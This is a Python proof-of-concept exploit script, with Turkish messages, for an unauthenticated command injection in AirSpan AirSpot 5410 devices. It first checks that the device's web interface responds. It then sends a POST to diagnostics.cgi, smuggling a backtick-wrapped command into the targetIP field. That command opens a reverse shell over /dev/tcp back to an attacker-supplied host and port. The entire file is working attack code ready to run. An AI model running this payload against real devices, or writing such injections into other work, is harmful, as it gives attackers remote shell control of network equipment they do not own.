from __future__ import print_function, unicode_literals
import argparse
from colorama import Fore
import requests
import urllib3
urllib3.disable_warnings()

def banner():
  airspanLogo = """"""
  return print('\033[1;94m{}\033[1;m'.format(airspanLogo))

def pingWebInterface(RHOST, RPORT):
  url = 'https://{}:{}'.format(RHOST, RPORT)
  try:
    response = requests.get(url, allow_redirects=False, verify=False, timeout=30)
    if response.status_code != 200:
      print(Fore.RED+'[-]'+Fore.RESET+" Hata: Airspot 5410 Cihaz Web Arayüzü ulaşılamazdır. Belirtilen IP'nin doğru olduğundan emin olun.")
      exit()
    print(Fore.BLUE+'[i]'+Fore.RESET+' AirSpan Cihaz Web Arayüzü erişilebilir görünüyor!')
  except:
    print(Fore.RED+'[-]'+Fore.RESET+" Hata: Airspot 5410 Cihaz Web Arayüzü ulaşılamazdır. Belirtilen IP'nin doğru olduğundan emin olun.")
    exit()


def execReverseShell(RHOST, RPORT, LHOST, LPORT):
  payload = '`sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261`'.format(LHOST, LPORT)
  data = 'Command=pingDiagnostic&targetIP=1.1.1.1{}&packetSize=55&timeOut=10&count=1'.format(payload)
  try:
    print(Fore.BLUE+'[i]'+Fore.RESET+' Reverse Shell yürütme ...')
    response = requests.post('https://{}:{}/cgi-bin/diagnostics.cgi'.format(RHOST, RPORT), data=data, verify=False)
    print(Fore.BLUE+"[i]"+Fore.RESET+" Reverse Shell başarıyla yürütüldü. {}:{}".format(LHOST, LPORT))
    return
  except Exception as e:
      print(Fore.RED+"[-]"+Fore.RESET+" Reverse Shell başarısız oldu. AirPot 5410 cihazının ana bilgisayara ulaşabildiğinden emin olun {}:{}").format(LHOST, LPORT)
      return False

def main():
  banner()
  args = parser.parse_args()
  pingWebInterface(args.RHOST, args.RPORT)
  execReverseShell(args.RHOST, args.RPORT, args.LHOST, args.LPORT)


if __name__ == "__main__":
  parser = argparse.ArgumentParser(description='AirSpan Airspot cihazlarında nautenticated bir uzaktan komut enjeksiyonundan yararlanan komut dosyası POC.', add_help=False)
  parser.add_argument('--RHOST', help="Hedef makinenin IP'sini ifade eder. (Airspan AirSpot device)", type=str, required=True)
  parser.add_argument('--RPORT', help="Hedef makinenin açık bağlantı noktasını ifade eder. (443 by default)", type=int, required=True)
  parser.add_argument('--LHOST', help="Makinenizin IP'sini ifade eder.", type=str, required=True)
  parser.add_argument('--LPORT', help="Makinenizin açık bağlantı noktasını ifade eder.", type=int, required=True)
  main()